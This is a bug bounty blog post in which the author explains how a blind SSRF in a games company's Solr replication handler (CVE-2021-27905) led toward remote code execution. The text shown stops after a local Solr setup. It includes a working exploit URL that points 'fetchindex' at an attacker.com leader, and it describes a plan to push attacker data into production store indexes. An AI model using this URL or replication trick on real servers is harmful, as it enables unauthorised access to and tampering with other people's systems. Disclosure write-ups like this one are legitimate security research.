---
layout: post
title: A very fancy technique to obtain RCE on a Solr server 
date: 2025/02/02
tags: web bugbounties
permalink: /posts/rce-on-solr-server-via-replication
header:
  teaser: 
---

{% raw %}Hello there! In this post, I will be discussing one of the most beautiful and complex vulnerabilities I have ever found, and how it got triaged as "Duplicate" although I was the only one achieving RCE. I discovered it some weeks ago in the same bug bounty program as the one described in <a href="/posts/unrestricted-access-and-arbitrary-file-read-in-solr-endpoint">my previous post</a>. As back then, since this is a private program, I will need to hide many stuff. However, I can tell you that it belongs to one of the biggest videogames companies, which doesn't have a very good relationship with hackers and other tinkerers ;). I hope you appreciate it and find it as interesting as me!


[[ Previous work ]]

This story begins last year, when I found three vulnerabilities in different Solr servers from a single private program. As already mentioned, some of these vulnerabilities are described in <a href="/posts/unrestricted-access-and-arbitrary-file-read-in-solr-endpoint">another post from this blog</a>. I really recommend reading it first, since it serves as an introduction to some Solr concepts that will be discussed here.

During this time, I also found a blind SSRF in one of those Solr servers, which contained the front end data for all european stores of the company, such as product names, descriptions, image URLs, prices, sales, etc. It didn't contain any private information, so it was open and could be queried freely. Since the blind SSRF was not a high or critical severity bug, I didn't report it and decided to keep it to myself in case I could use it in the future as part of a more complex exploit chain. However, I ended up leaving this bug behind and moving on to some other projects.

Some months later (two weeks ago at the time of writing this post), I decided that I would like to spend more time doing bug bounties. I thought that it could be a good starting point to check all my previous notes for the vulnerabilities that I had reported in the past, in case something had changed. The goal was to get into the mood and to try preparing my mind to start hacking consistently, as I have found during my career that the mental aspect is the most difficult part for me when doing bug bounties.

When I remembered that I had a blind SSRF in a program in which I had already found two high and one critical bugs, I knew that I had to take another look. However, this time I was going to take a more research-like approach and was decided to dig much deeper into Solr. I quickly verified that the blind SSRF was still exploitable and got into it.


[[ Understanding the blind SSRF ]]

My first objective was to fully understand the blind SSRF vulnerability, since I originally found it by looking for common Solr vulnerabilities and didn't go any deeper. It is identified as <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-27905">CVE-2021-27905</a>, and was found in the replication handler of the Solr server, which was located at "/solr/&lt;core&gt;/replication". It could be triggered by visiting the following URL, where "en" is the name of one of the available Solr cores:

<div class="code">https://target.com/solr/en/replication?command=fetchindex&leaderUrl=attacker.com</div>

In order to learn more about the functionality involved in this bug, I needed to look at the Solr docs. Luckily, Apache maintains a huge web portal to host the Solr documentation, so it was not diffcult to find the <a href="https://solr.apache.org/guide/solr/latest/deployment-guide/user-managed-index-replication.html">chapter related to Index Replication</a>. As I learnt, replication allows creating an infrastructure of several Solr instances in which a leader instance distributes copies of its data to the follower instances. The leader then manages updates to the data while the followers manage the querying.

<img src="/assets/images/posts/2025-02-21/replication.png" style="width: 15em">

Each of the instances that participate in this infrastructure has an available request handler ("/replication"), which accepts a series of commands depending if its a leader or a follower. These commands are detailed in <a href="https://solr.apache.org/guide/solr/latest/deployment-guide/user-managed-index-replication.html#http-api-commands-for-the-replicationhandler">one of the sections of the Index Replication chapter</a>, in which "fetchindex" is described as follows:

<div class="code">fetchindex

  Force the specified follower to fetch a copy of the index from its leader.

    http://_follower_host:port_/solr/_core_name_/replication?command=fetchindex

  You can pass an extra attribute such as leaderUrl or compression (or any other parameter described in Configuring a Follower Server) to do a one time replication from a leader. This removes the need for hard-coding the leader URL in the follower configuration.
</div>

This meant that the Solr server in which I found the blind SSRF was a follower instance, for which a leader could be specified to perform a one time replication from it by using the "fetchindex" command. When I learnt about this, the first thing I thought was that maybe I could be able to create a malicious Solr server that acted as a leader and distribute a copy of my own data into the target server. Since the target Solr server acted as the database for all Europe stores of the company, this would mean that I would be able to modify the contents of all european stores of the company! This sounded great, but there was a long road ahead.

Looking around, I also learnt about other replication commands, such as "details" which can be used to retrieve the replication configuration.


[[ Creating my own Solr instance ]]

The goal now was to deploy a malicious Solr instance that acted as a leader for the target Solr server and check if this malicious instance could serve custom data to it. Since this was a production environment, this process needed be as less destructive as possible. What I thought was to first replicate the data, then add a custom entry and then distribute the data back to the target server. This way, the service wouldn't be interrupted in any way, but I could easily prove that I was able to modify the data by querying for the newly added entry.

So, I downloaded the latest binary release from the <a href="https://solr.apache.org/downloads.html">Solr webiste</a> and followed their <a href="https://solr.apache.org/guide/solr/latest/deployment-guide/installing-solr.html">deployment guide</a>. This binary release includes a command line interface tool that allows starting/stoping Solr, managing cores, basic configuration, etc. This way, Solr can be started on port 9000 with the following command:

<div class="code">$ ./bin/solr start -p 9000</div>

Once the "start" command has completed, the admin interface can be accessed at "http://127.0.0.1:9000/":

<img src="/assets/images/posts/2025-02-21/solr_admin.png" style="width: 50em">

The next step is to create a core, which is just a fancy name for a dataset. The following command creates a new empty core named "hacefresk0":

<div class="code">$ ./bin/solr create -c hacefresk0</div>

It can then be queried at the select request handler:

<div class="code">$ curl "http://localhost:9000/solr/hacefresk0/select?q=*"

{
  "responseHeader":{
    "status":0,
    "QTime":0,
    "params":{
      "q":"*"
    }
  },
  "response":{
    "numFound":0,
    "start":0,
    "numFoundExact":true,
    "docs":[ ]
  }
}
</div>

{% endraw %}